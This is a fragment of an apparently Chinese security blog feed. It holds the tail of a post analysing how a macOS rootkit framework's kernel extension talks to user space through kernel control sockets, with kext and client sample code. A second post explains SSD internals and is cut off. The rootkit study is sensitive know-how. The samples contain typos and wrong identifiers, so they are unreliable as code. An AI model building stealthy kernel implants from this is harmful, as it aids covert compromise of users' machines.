class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line">#include &lt;sys/systm.h&gt;</div><div class="line">#include &lt;mach/mach_types.h&gt;</div><div class="line">#include &lt;mach/kern_return.h&gt; </div><div class="line">#include &lt;sys/kern_control.h&gt;</div><div class="line">//#include &lt;SOMEWHERE YOU CAN GET STRNCPY IN THE KERNEL FROM&gt;</div><div class="line"></div><div class="line">char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext</div><div class="line">struct kern_ctl_ref _ctlref ; </div><div class="line"></div><div class="line">kern_return_t start(kmod_info_t *info, void *data)</div><div class="line">&#123;</div><div class="line">int err ;</div><div class="line"></div><div class="line">struct kern_ctl_reg ctlreg ;</div><div class="line">bzero(&amp;ctlreg, sizeof(ctlreg)) ;</div><div class="line"></div><div class="line">//控制信息</div><div class="line">ctlreg.ctl_id = 0 ; /* 请求分配一个动态id */</div><div class="line">ctlreg.ctl_unit = 0 ;</div><div class="line">strncpy(ctlreg.ctl_name, name, sizeof(ctlreg.ctl_name));</div><div class="line"></div><div class="line"></div><div class="line">//回调函数</div><div class="line">ctlreg.ctl_connect_func = connect ;</div><div class="line">ctlreg.ctl_disconnect_func = disconnect ;</div><div class="line">ctlreg.ctl_send_func = send ;</div><div class="line">ctlreg.ctl_getopt_func = getopt ;</div><div class="line">ctlreg.ctl_setopt_func = setopt ;</div><div class="line"></div><div class="line">//注册内核控制</div><div class="line">err = ctl_register(&amp;ctlreg, &amp;_ctlref) ;</div><div class="line">if (err) return KERN_FAILURE ;</div><div class="line"></div><div class="line">return KERN_SUCCESS ;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>下面解释下其中的<code>kern_ctl_ref</code>数据结构</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">struct kern_ctl_reg</div><div class="line">&#123;</div><div class="line">/* 控制信息 */</div><div class="line">charctl_name[MAX_KCTL_NAME];</div><div class="line">u_int32_tctl_id;</div><div class="line">u_int32_tctl_unit;</div><div class="line"></div><div class="line">    /* 控制设置 */</div><div class="line">    u_int32_tctl_flags;</div><div class="line">    u_int32_tctl_sendsize;</div><div class="line">    u_int32_tctl_recvsize;</div><div class="line"></div><div class="line">    /* 回调函数 */</div><div class="line">    ctl_connect_func    ctl_connect;//建立连接时调用</div><div class="line">    ctl_disconnect_func    ctl_disconnect;//断开连接时调用</div><div class="line">    ctl_send_func    ctl_send;//处理从client到kernel的数据发送</div><div class="line">    ctl_setopt_func    ctl_setopt; //当client调用setsockopt时调用</div><div class="line">    ctl_getopt_func    ctl_getopt;//当client调用getsockopt时调用</div><div class="line">&#125;;</div></pre></td></tr></table></figure><h4 id="client-示例代码"><a href="#client-示例代码" class="headerlink" title="client 示例代码"></a>client 示例代码</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div></pre></td><td class="code"><pre><div class="line">#include &lt;socket.h&gt;</div><div class="line">#include &lt;string.h&gt;</div><div class="line">#include &lt;sys/kern_control.h&gt;</div><div class="line">#include &lt;sys/ioctl.h&gt;</div><div class="line"></div><div class="line">char name[] = &quot;com.example.mymodule&quot; ;//标识这个kext</div><div class="line">static int g_socket = -1;</div><div class="line">u_int32_t getctlidbybame(int sock, char *name) ;</div><div class="line"></div><div class="line">//建立连接</div><div class="line">int socket_ctl(char *name)</div><div class="line">&#123;</div><div class="line">int g_sock = socket(PF_SYSTEM, SOCK_DGRAM, SYSPROTO_CONTROL) ;</div><div class="line">if (g_sock == 0) return 0 ;</div><div class="line"></div><div class="line">u_int32_t id = getctlidbyname(g_sock, name) ;</div><div class="line"></div><div class="line">sockaddr_ctl addr ;</div><div class="line">addr.sc_len = sizeof(addr) ;</div><div class="line">addr.sc_family = AF_SYSTEM ;</div><div class="line">addr.sc_sysaddr = AF_SYS_CONTROL ;</div><div class="line">addr.sc_id = id ;</div><div class="line">addr.sc_unit = 0 ; /* allocate dynamically */</div><div class="line"></div><div class="line">int err ;</div><div class="line">err = connect(g_sock, (struct sockaddr*)&amp;addr, sizeof(addr)) ;</div><div class="line">if (err) return 0 ;</div><div class="line"></div><div class="line">return sock ;</div><div class="line">&#125;</div><div class="line"></div><div class="line">u_int32_t getctlidbybame(int sock, char *name)</div><div class="line">&#123;</div><div class="line">struct ctl_info info ;</div><div class="line">memset(&amp;info, 0, sizeof(info)) ;</div><div class="line">strncpy(info.ctl_name, name, strlen(name)) ;</div><div class="line">int err = ioctl(sock, CTLIOCGINGO, &amp;info) ;</div><div class="line">if (err) return 0 ; /* should do something stronger here! */</div><div class="line">return info.ctl_id ;</div><div class="line">&#125;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">int main(int argc, const char *argv[])</div><div class="line">&#123;</div><div class="line">socket_ctl(name);</div><div class="line">&#125;</div><div class="line"></div><div class="line">//发送数据</div><div class="line">void execute_cmd(int cmd, char *args)</div><div class="line">&#123;</div><div class="line">char data[32] = &#123; 0 &#125;;</div><div class="line">size_t data_len = 0;</div><div class="line">int retv;</div><div class="line"></div><div class="line">if(args != NULL) &#123;</div><div class="line">memcpy(data, args, strlen(args));</div><div class="line">&#125;</div><div class="line"></div><div class="line">data_len = strlen(data) + 1;</div><div class="line"></div><div class="line">retv = setsockopt(g_socket, SYSPROTO_CONTROL, cmd, (void *)data, (socklen_t)data_len);</div><div class="line"></div><div class="line">if(retv != 0) &#123;</div><div class="line">printf(&quot;[ERROR] Kernel command execution failed:\n&quot;);</div><div class="line">printf(&quot;\t%s (%d)\n&quot;, strerror(errno), errno);</div><div class="line"></div><div class="line">return;</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">//接收数据</div><div class="line">void get_data()</div><div class="line">&#123;</div><div class="line">char *data = malloc(32);</div><div class="line"></div><div class="line">socklen_t data_len = 32;</div><div class="line"></div><div class="line">int retv = getsockopt(g_socket, SYSPROTO_CONTROL, 0, data, &amp;data_len);</div><div class="line"></div><div class="line">if(retv != 0) &#123;</div><div class="line">printf(&quot;[ERROR] getsockopt()\n&quot;);</div><div class="line"></div><div class="line">return;</div><div class="line">&#125;</div><div class="line"></div><div class="line">size_t r = recv(g_socket, data, data_len, 0);</div><div class="line"></div><div class="line">if(r == 0) &#123;</div><div class="line">printf(&quot;[ERROR] recv()\n&quot;);</div><div class="line"></div><div class="line">return;</div><div class="line">&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>代码不是很复杂，先通过kext名去获取一个id建立一个socket，然后通过这个socket去发送和接受kext的数据。</p><h3 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03 总结"></a>0x03 总结</h3><p>在这个rootKit框架中还有很多可以挖掘的东西，里面hook系统调用来达到反kill等功能很是实用，以及一些内核操作手段都值得学习和借鉴，待续…</p><h3 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h3><ul><li><a href="http://www.tanhao.me/pieces/1515.html/" target="_blank" rel="external">http://www.tanhao.me/pieces/1515.html/</a></li><li><a href="https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html" target="_blank" rel="external">https://urchin.earth.li/~twic/Kernel_Extensions_for_OS_X.html</a></li><li><a href="https://github.com/enzolovesbacon/inficere">https://github.com/enzolovesbacon/inficere</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;最近在学习一个Mac平台上开源的rootKit框架，里面确实有很多干货，本文就来分析其中与用户层交互的部分。&lt;br&gt;简单说下rootKit原理：&lt;br&gt;利用kext驻留在内核，完成实际的各种功能：&lt;br&gt;&lt;code&gt;sys
      
    
    </summary>
    
      <category term="kext/iokit" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/categories/kext-iokit/"/>
    
    
      <category term="kext" scheme="https://github.com/4ch12dy/4ch12dy.github.io.git/tags/kext/"/>
    
  </entry>
  
  <entry>
    <title>浅谈SSD与安全擦除</title>
    <link href="https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/08/%E6%B5%85%E8%B0%88SSD%E4%B8%8E%E5%AE%89%E5%85%A8%E6%93%A6%E9%99%A4/SSD%E4%B8%8E%E5%AE%89%E5%85%A8%E6%93%A6%E9%99%A4/"/>
    <id>https://github.com/4ch12dy/4ch12dy.github.io.git/2017/08/08/浅谈SSD与安全擦除/SSD与安全擦除/</id>
    <published>2017-08-08T06:27:59.000Z</published>
    <updated>2017-08-08T06:40:43.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="SSD与安全擦除"><a href="#SSD与安全擦除" class="headerlink" title="SSD与安全擦除"></a>SSD与安全擦除</h2><blockquote><blockquote><p>目录<br>0x01 SSD简介<br>0x02 SSD安全擦除原理及工具<br>0x03 参考</p></blockquote></blockquote><h3 id="0x01-SSD简介"><a href="#0x01-SSD简介" class="headerlink" title="0x01 SSD简介"></a>0x01 SSD简介</h3><h4 id="1-1-SSD的组成结构"><a href="#1-1-SSD的组成结构" class="headerlink" title="1.1    SSD的组成结构"></a>1.1    SSD的组成结构</h4><p>SSD 的关键部件由控制器和存储单元两部分组成。除此之外，还有缓存和主机接口。</p><h5 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h5><p>每个 SSD 都有一个控制器(controller)将存储单元连接到电脑。控制器是一个执行固件(firmware)代码的嵌入式处理器。主要功能如下：</p><ul><li>错误检查和纠正(ECC)</li><li>磨损平衡(Wear leveling)</li><li>坏块映射(Bad block mapping)</li><li>read disturb(读取某个块的数据的时候会影响到相邻块的数据)管理</li><li>缓存控制</li><li>垃圾回收</li><li>加密</li></ul><h5 id="存储单元"><a href="#存储单元" class="headerlink" title="存储单元"></a>存储单元</h5><p>SSD固态硬盘，存储介质和机械硬盘完全不同，其依靠三极管的充放电实现，而非磁场。<br>目前，介质主要有三种：SLC，MLC和TLC</p><ul><li>SLC=Single-LevelCell，即1bit/cell，速度快寿命长，价格超贵（约MLC3倍以上的价格），约10万次擦写寿命 </li><li>MLC=Multi-LevelCell，即2bit/cell，速度一般寿命一般，价格一般，约3000—10000次擦写寿命 </li><li>TLC=Trinary-LevelCell，即3bit/cell，也有Flash厂家叫8LC，速度慢寿命短，价格便宜，约500次擦写寿命。</li></ul><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/smt.jpg?raw=true" alt="0-1"></p><p>每cell可存储的比特位表示了存储的能力，可以看出TLC的每cell存储能力最强，一个cell可以存储3比特，但相对的，TLC的寿命最短，即可擦写次数最少。当擦写次数达到寿命值时，读写数据将不再有效，具体的寿命可以参考具体闪存颗粒数据手册。</p><p>在机械硬盘上，由于机械硬盘的数据可以直接覆盖，所以LBA和PBA(Physical Block Address)的关系是1:1对应，不会变更，即LBA=PBA。但在SSD上，这种关系就变得复杂了，原因是SSD使用的存储介质NAND闪存有需要先擦除才能再写入，因为读写以页为单位，擦除以块（多个页组成）为单位的特性，导致LBA和PBA的关系不再是固定不变的。<br>NAND闪存的擦除/写入关系请参考下图：</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/0-0.png?raw=true" alt="0-0"></p><h5 id="缓存"><a href="#缓存" class="headerlink" title="缓存"></a>缓存</h5><p>基于 NAND 闪存的 SSD 通常带有一个基于 DRAM 的缓存，其作用与普通的机械式硬盘类似，但是还会存储一些诸如 Wear leveling 数据之类的其他数据。把数据先缓存在 DRAM 中，然后集中写入，从而减少写入次数。特例之一是 SandForce 生产的控制器，它并不含有缓存，但是性能依旧很出色，由于其结构简单，故而可以生产体积更小的 SSD，并且掉电时数据更安全。</p><h5 id="主机接口"><a href="#主机接口" class="headerlink" title="主机接口"></a>主机接口</h5><p>主机接口与控制器紧密相关，但是通常与传统的机械式硬盘相差不大，主要有以下几种：</p><ul><li>SATA</li><li>SAS</li><li>PCI-E</li><li>Fibre Channel</li><li>USB</li></ul><p>主机接口的速度限制了 SSD 所能达到的速度峰值。但是一般这并不是瓶颈所在。</p><h4 id="1-2-SSD-技术解析"><a href="#1-2-SSD-技术解析" class="headerlink" title="1.2 SSD 技术解析"></a>1.2 SSD 技术解析</h4><h5 id="FTL（Flash-translation-layer）"><a href="#FTL（Flash-translation-layer）" class="headerlink" title="FTL（Flash translation layer）"></a>FTL（Flash translation layer）</h5><p>前面说过，闪存的读写单位为页，而页的大小一般为4KB或8KB，但我们的操作系统读写数据是按机械硬盘的扇区尺寸进行的（512Byte），更麻烦的是闪存擦除以块作单位，而且未擦除就无法写入，这导致操作系统现在使用的文件系统根本无法管理SSD，需要更换更先进、复杂的文件去解决这个问题，但这样就会加重操作系统的负担。 </p><p>为了不加重操作系统的负担，SSD采用软件的方式把闪存的操作虚拟成磁盘的独立扇区操作，这就是FTL。因FTL存在于文件系统和物理介质（闪存）之间，操作系统只需跟原来一样操作LBA即可，而LBA到PBA的所有转换工作，就全交由FTL负责。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/0-1.png?raw=true" alt="0-1"></p><p>FTL算法，其实就是一种LBA到PBA的映射。当文件系统发送指令要写入或者更新一个特定的逻辑页时，FTL实际上是把数据写入到一个不同的空闲物理页并更新映射表（LBA和PBA的关联数据），并把这个页上包含的“旧数据”标记为“无效”（更新后的数据已经写入新的PBA，旧地址的数据自然就失效了）。正是因为FTL的存在，操作系统才能把SSD当成HDD那样操作，因此FTL转换的性能也就直接影响SSD的性能表现。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/0-2.png?raw=true" alt="0-2"></p><p>我们现在看上图，假设在page0上写入数据(物理地址n）,接下来写入数据到page1(物理地址n+1)。接着page0数据被更新，但是更新后的数据并不是覆盖上去，FTL会把它写入到地址(n+2)上，然后标记(地址n)为“无效”。经过多次这样的操作后，这个块上就会装满了许多“有效”及“无效”的数据。如果要再次写入到这个块，就需要先擦除整个块的数据，当然就需要先把所有“有效”的数据复制到另外的空白块上再进行擦除。这样的操作就是GC（Garbagecollection）垃圾回收。</p><h4 id="WL（Wear-leveling）磨损平衡"><a href="#WL（Wear-leveling）磨损平衡" class="headerlink" title="WL（Wear leveling）磨损平衡"></a>WL（Wear leveling）磨损平衡</h4><p>简单说来，磨损平衡是确保闪存的每个块被写入的次数相等的一种机制。</p><p>通常情况下，在 NAND 块里的数据更新频度是不同的：有些会经常更新，有些则不常更新。很明显，那些经常更新的数据所占用的块会被快速的磨损掉，而不常更新的数据占用的块磨损就小得多。为了解决这个问题，需要让每个块的编程(擦写)次数尽可能保持一致：这就是需要对每个页的读取/编程操作进行监测，在最乐观的情况下，这个技术会让全盘的颗粒物理磨损程度相同并同时报废。</p><p>磨损平衡算法分静态和动态。动态磨损算法是基本的磨损算法：只有用户在使用中更新的文件占用的物理页地址被磨损平衡了。而静态磨损算法是更高级的磨损算法：在动态磨损算法的基础上，增加了对于那些不常更新的文件占用的物理地址进行磨损平衡，这才算是真正的全盘磨损平衡。简单点说来，动态算法就是每次都挑最年轻的 NAND 块来用，老的 NAND 块尽量不用。静态算法就是把长期没有修改的老数据从一个年轻 NAND 块里面搬出来，重新找个最老的 NAND 块放着，这样年轻的 NAND 块就能再度进入经常使用区。概念很简单，但实现却非常的复杂，特别是静态。</p><p>尽管磨损均衡的目的是避免数据重复在某个空间写入，以保证各个存储区域内磨损程度基本一致，从而达到延长固态硬盘的目的。但是，它对固态硬盘的性能有不利影响。</p><h4 id="GC（Garbagecollection）垃圾回收"><a href="#GC（Garbagecollection）垃圾回收" class="headerlink" title="GC（Garbagecollection）垃圾回收"></a>GC（Garbagecollection）垃圾回收</h4><p>所谓GC就是把一个闪存块里的‘有效’页数据复制到一个‘空白’块里，然后把这个块完全擦除。GC是SSD里的一个非常关键的操作，其效率对性能有决定性影响。闪存块里‘有效’页的数量对GC效率有决定性的影响，因数量越少，需要复制的页就越少， 花费的时间也越少，效率就高了。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/gc_1.jpg?raw=true" alt="0-2"></p><p>下图是把X块和Y块里的“有效”页复制到N块里，然后擦除X和Y以作备用的“空白块”</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/gc_2.png?raw=true" alt="0-2"></p><p>有三种垃圾回收策略：</p><ul><li>闲置垃圾回收：很明显在进行垃圾回收时候会消耗大量的主控处理能力和带宽造成处理用户请求的性能下降，SSD 主控制器可以设置在系统闲置时候做“预先”垃圾回收(提前做垃圾回收操作)，保证一定数量的”备用空白块”，让 SSD 在运行时候能够保持较高的性能。闲置垃圾回收的缺点是会增加额外的”写入放大”，因为你刚刚垃圾回收的”有效数据”，也许马上就会被更新后的数据替代而变成”无效数据”，这样就造成之前的垃圾回收做无用功了。</li><li>被动垃圾回收：每个 SSD 都支持的技术，但是对主控制器的性能提出了很高的要求，适合在服务器里用到，SandForce 的主控就属这类。在垃圾回收操作消耗带宽和处理能力的同时处理用户操作数据，如果没有足够强劲的主控制器性能则会造成明显的速度下降。这就是为啥很多 SSD 在全盘写满一次后会出现性能下降的道理，因为要想继续写入数据就必须要边垃圾回收边做写入。</li><li>手动垃圾回收：用户自己手动选择合适的时机运行垃圾回收软件，执行垃圾回收操作。</li></ul><p>可以想象，如果系统经常进行垃圾回收处理，频繁的将一些区块进行擦除操作，那么 SSD 的寿命反而也会进一步下降。由此把握这个垃圾回收的频繁程度，同时确保 SSD 中的闪存芯片拥有更高的使用寿命，这确实需要找到一个完美的平衡点。所以，SSD 必须要支持 Trim 技术，不然 GC 就显不出他的优势了。</p><h4 id="Trim"><a href="#Trim" class="headerlink" title="Trim"></a>Trim</h4><p>Trim 是一个 ATA 指令，当操作系统删除文件或格式化的时候，由操作系统同时把这个文件地址发送给 SSD 的主控制器，让主控制器知道这个地址的数据无效了。</p><p>当你删除一个文件的时候，文件系统其实并不会真正去删除它，而只是把这个文件地址标记为“已删除”，可以被再次使用，这意味着这个文件占的地址已经是“无效”的了。这就会带来一个问题，硬盘并不知道操作系统把这个地址标记为“已删除”了，机械盘的话无所谓，因为可以直接在这个地址上重新覆盖写入，但是到了 SSD 上问题就来了。NAND 需要先擦除才能再次写入数据，要得到空闲的 NAND 空间，SSD 必须复制所有的有效页到新的空闲块里，并擦除旧块(垃圾回收)。如果没有 Trim 指令，意味着 SSD 主控制器不知道这个页是“无效”的，除非再次被操作系统要求覆盖上去。</p><p>Trim 只是条指令，让操作系统告诉 SSD 主控制器这个页已经“无效”了。Trim 会减少写入放大，因为主控制器不需要复制“无效”的页(没 Trim 就是“有效”的)到空白块里，这同时代表复制的“有效”页变少了，垃圾回收的效率和 SSD 性能也提升了。</p><p>Trim 能大量减少伪有效页的数量，它能大大提升垃圾回收的效率。</p><p>目前，支持 Trim 需要三个要素，缺一不可：</p><ul><li>系统： 操作系统必须会发送 Trim 指令，Win7, Win2008R2 , Linux-2.6.33 以上。</li><li>固件： SSD 的厂商在固件里要放有 Trim 算法，也就是 SSD 的主控制器必须认识 Trim 指令。</li><li>驱动： 控制器驱动必须要支持 Trim 指令的传输，也就是能够将 Trim 指令传输到 SSD 控制器。MS 的驱动，Intel 的 AHCI 驱动目前支持。别的要看之后的更新了。<br>目前，RAID 阵列里的盘明确不支持 TRIM，不过 RAID 阵列支持 GC。</li></ul><h4 id="OP（Over-provisioning）预留空间"><a href="#OP（Over-provisioning）预留空间" class="headerlink" title="OP（Over-provisioning）预留空间"></a>OP（Over-provisioning）预留空间</h4><p>SSD上的OP指的是用户不可操作的容量，大小为实际容量减去用户可用容量，OP区域一般被用于优化操作如：WL，GC和坏块映射等。<br>OP一般分三层（见下图）。第一层容量固定为SSD标称容量的7.37%，这是因为标称容量采用千进制为单位，而NAND颗粒容量单位为1024进制，两者正好相差约7.37%。这部分空间被默认用于作OP。第二层OP是否存在及容量大小取决于厂商设置。第三层OP是用户在日常使用中可以分配的，像Fusion-IO公司还给其用户提供工具让他们自行调节大小以满足不同的耐用度及性能要求，一般用户也可以自己在初次分区的时候，不把所有的SSD容量都分满来达到相同目的，此处有一点要注意，若非首次分区就留出空间，必须要先进行全盘擦除，否则没有效果。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/op_1.png?raw=true" alt="po1"></p><p>虽然OP会减少SSD的可用容量，但有减少WA、提高寿命、性能的正面作用。请看下图：两个相同的64G SSD，左边的分区50G，右边的全部容量分区。格式化后容量分别为：46G和59G左右。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/op_2.png?raw=true" alt="po2"></p><p>我们知道在操作系统下,要写入共59G的数据时，左边的盘必须删除13G的‘无效’数据才行。右边的盘不需擦除就能写入所有59G数据，由SSD映射表的操作方式可知，删除后继续写入的数据在物理上会继续写入整个盘（写入OP1和OP2），在LBA上会覆盖被删除数据的地址。也就是说，同样写入59G数据，左边的盘已经包含了13G“无效”数据了。（那些被重映射到预留空间的数据，原地址数据就是“无效”、“过期”的）。所以说图中SSD里LBA上数据“有效”的机会比右边要少，因为LBA容量小(分区小)，所以在做垃圾回收处理时，需要复制的“有效”数据也少了，自然效率就提高了。<br>一般来说，建议在不支持Trim或对SSD的性能有较高要求的时候，如数据库等类的应用，增加一定比例的第三层OP容量（此空间需要先做HDD ERASE，保证没有被使用过），可以很好的起到保持速度，提高寿命的作用。（如必须用SSD组建RAID时，强烈建议留部分OP容量以弥补没有Trim产生的影响。）</p><h4 id="WA（Write-Amplification）写入放大"><a href="#WA（Write-Amplification）写入放大" class="headerlink" title="WA（Write Amplification）写入放大"></a>WA（Write Amplification）写入放大</h4><p>WA是闪存及SSD相关的一个极为重要的属性。由于闪存必须先擦除才能再写入的特性，在执行这些操作时，数据都会被移动超过1次。这些重复的操作不单会增加写入的数据量，还会减少闪存的寿命，更吃光闪存的可用带宽而间接影响随机写入性能。<br>举个最简单的栗子：当要写入一个4KB的数据时，最坏的情况是一个块里已经没有干净空间了，但有无效的数据可以擦除，所以主控就把所有的数据读到缓存，擦除块，缓存里更新整个块的数据，再把新数据写回去，这个操作带来的写入放大就是: 实际写4K的数据，造成了整个块（共1024KB）的写入操作，那就是放大了256倍。同时还带来了原本只需要简单一步写入4KB的操作变成：闪存读取 (1024KB)→缓存改（4KB）→闪存擦除（1024KB）→闪存写入（1024KB），共四步操作，造成延迟大大增加，速度变慢。所以说WA是影响 SSD随机写入性能和寿命的关键因素。  </p><p>以100%随机4KB来写入，目前的大多数SSD主控，在最坏的情况下WA可以达到100以上。如果是100%持续的从低LBA写入到高LBA的话，WA可以做到1，实际使用中写入放大会介于这两者之间。<br>用户还可以设置一定的OP（预留空间）来减少WA，假设你有个128G的SSD，你只分了64G 的容量使用，那最坏情况下的写入放大就能减少约3倍。<br>许多因素影响SSD的WA。下面列出主要的因素，以及它们如何影响WA。</p><ol><li>垃圾回收（GC）— 虽然增加了写入放大，但是速度有提升。 这个比较特殊的算法用来移动，合并，擦除闪存块来提升效率。（详见GC章节）</li><li>预留空间（OP）— 减少写入放大。（预留空间越大，写入放大越低） 在SSD上划出部分空间留给主控做优化，是用户不能操作的空间。（详见OP章节）</li><li>Trim 开启后可以减少写入放大。 一个ATA指令，由操作系统发送给SSD主控，告诉主控哪些数据是无效的并且可以不用做垃圾回收操作。（详见Trim章节）</li><li>可用容量减少写入放大。（可用空间越大，写入放大越低） 用户使用中没有用到的空间。（需要有Trim支持，不然不会影响写入放大。）</li><li>安全擦除 Secure Erase 减少写入放大， ATA安全擦除命令用来清除在磁盘上的所有用户数据，这个指令会让SSD回到出厂时的性能（最优性能，最少写入放大），但是随着使用时间变长，GC操作恢复后，写入放大又会慢慢增加回来。许多软件使用ATA安全擦除指令来重置磁盘，最著名的为HDDErase。对SSD来说，重置就是（除了OP区域内的部分私有区域外的）全盘擦除操作，瞬间即可完成清除所有数据让SSD回到初始状态。但要注意，每操作一次，全盘寿命P/E次数减1。</li><li>持续写入（Sequential writes）减少写入放大。理论上来说，持续写入的写入放大为1，但是某些因素还是会影响这个数值。</li><li>静态/动态数据分离（Separating Static and Dynamic Data）减少写入放大。高端SSD主控制器支持静态和动态数据的分离处理，此操作要求SSD主控制器对LBA里经常写入（动态数据，热数据）和不经常写入（静态数据，冷数据）的数据块进行归类，因为如果块里同时包含了静态和动态数据，在做GC操作的时候会为了改写其实没必要的静态数据而增加写入放大，所以把包含静态数据的块归类后，因为不常改写，写入放大就减少了。但是迟早SSD主控会把这些静态的数据转移到别的地方来进行磨损平衡。（因为静态数据占着的数据块一直不改写，编程次数低于平均值的话，会造成颗粒磨损不平衡，违背了磨损平衡，确实非常矛盾的。）</li><li>随机写入（Random writes）提高写入放大，不好 随机写入会写入很多非连续的LBA，将会大大提升写入放大。</li><li>磨损平衡（WL）直接提高写入放大，不好 确保闪存的每个块被写入的次数相等的一种机制。</li></ol><h4 id="BBM（Bad-Block-Management）坏块管理"><a href="#BBM（Bad-Block-Management）坏块管理" class="headerlink" title="BBM（Bad Block Management）坏块管理"></a>BBM（Bad Block Management）坏块管理</h4><p>不管磨损平衡算法如何聪明，在运作中都会碰到一个头痛的问题，那就是坏块，所以一个SSD必须要有坏块管理机制。何谓坏块？一个NAND块里包含有不稳定的地址，不能保证读/写/擦的时候数据的准确性。其概念和传统机械式硬盘的坏块相似。</p><p><img src="https://github.com/NULL-ME/NULL-ME.github.io/blob/master/articlePic/SSD/bbm_1.jpg" alt="bbm1"></p><p>坏块分出厂坏块和使用过程中出现的坏块，和机械式硬盘的坏块表一样(P表和G表)，SSD也有坏块表。出厂坏块的话，在坏块上会有标记，所以很容易就能被识别，后期使用中出现的坏块就要靠主控制器的能力了，一般来说，越到NAND生命的后期(P/E数开始接近理论最大值)，坏块就会开始大量出现了。NAND出厂前都会被执行擦除操作，厂商会在出货前会把坏块标记出来(厂商会在坏块的第一个页的SA区上打上标记)。这样坏块管理软件就能靠监测SA区标记来制作坏块表。SA区的意思是页中4096~4319的区域，用户不可访问，主要用来存放ECC算法、坏块信息、文件系统资料等。由于在使用中会产生坏块，所以SSD的每次编程/擦除/复制等操作后都要检查块的状态。对颗粒的ECC要求也要达到厂商的标准以上(主控强不强，看ECC能力也是一个参考)。</p><h4 id="ECC（Error-Checking-and-Correction）校验和纠错"><a href="#ECC（Error-Checking-and-Correction）校验和纠错" class="headerlink" title="ECC（Error Checking and Correction）校验和纠错"></a>ECC（Error Checking and Correction）校验和纠错</h4><p>ECC的全称是Error Checking and Correction，是一种用于Nand的差错检测和修正算法。由于NAND Flash的工艺不能保证NAND在其生命周期中保持性能的可靠，因此，在NAND的生产中及使用过程中会产生坏块。为了检测数据的可靠性，在应用NAND Flash的系统中一般都会采用一定的坏区管理机制，而管理坏区的前提是能比较可靠的进行坏区检测。如果操作时序和电路稳定性不存在问题的话，NAND Flash出错的时候一般不会造成整个Block或是Page不能读取或是全部出错，而是整个Page中只有一个或几个bit出错，这时候ECC就能发挥作用了。不同颗粒有不同的基本ECC要求，不同主控制器支持的ECC能力也不同，理论上说主控越强ECC能力越强</p><h3 id="0x02-SSD安全擦除原理和工具"><a href="#0x02-SSD安全擦除原理和工具" class="headerlink" title="0x02 SSD安全擦除原理和工具"></a>0x02 